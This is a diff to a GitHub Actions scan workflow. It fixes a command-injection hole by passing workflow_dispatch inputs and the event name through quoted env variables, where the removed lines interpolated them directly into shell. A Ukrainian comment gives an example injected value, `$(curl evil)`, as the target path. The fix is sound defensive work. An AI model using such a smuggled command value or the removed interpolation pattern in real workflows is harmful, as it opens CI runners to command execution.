@@ -78,6 +78,13 @@ jobs:
 
       - name: Determine scan mode
         id: mode
+        # Security-аудит vdlyeg (10.06.2026): inputs.* (вільний текст з workflow_dispatch)
+        # та event_name через env, не пряму інтерполяцію у shell — інакше target_path виду
+        # `$(curl evil)` дав би command injection у runner. Беремо як "$VAR" у лапках.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_SCAN_MODE: ${{ inputs.scan_mode }}
+          INPUT_TARGET_PATH: ${{ inputs.target_path }}
         run: |
           # Визначаємо режим залежно від event:
           # - workflow_dispatch (UI) → input
@@ -88,10 +95,10 @@ jobs:
           #     claude/scan/file/{path}       → mode=file, target=path
           # - push у main → changed (на code-зміни через paths-фільтр у on:)
           TRIGGER_BRANCH=""
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            MODE="${{ inputs.scan_mode }}"
-            TARGET="${{ inputs.target_path }}"
-          elif [ "${{ github.event_name }}" = "schedule" ]; then
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            MODE="$INPUT_SCAN_MODE"
+            TARGET="$INPUT_TARGET_PATH"
+          elif [ "$EVENT_NAME" = "schedule" ]; then
             MODE="full"
             TARGET=""
           else
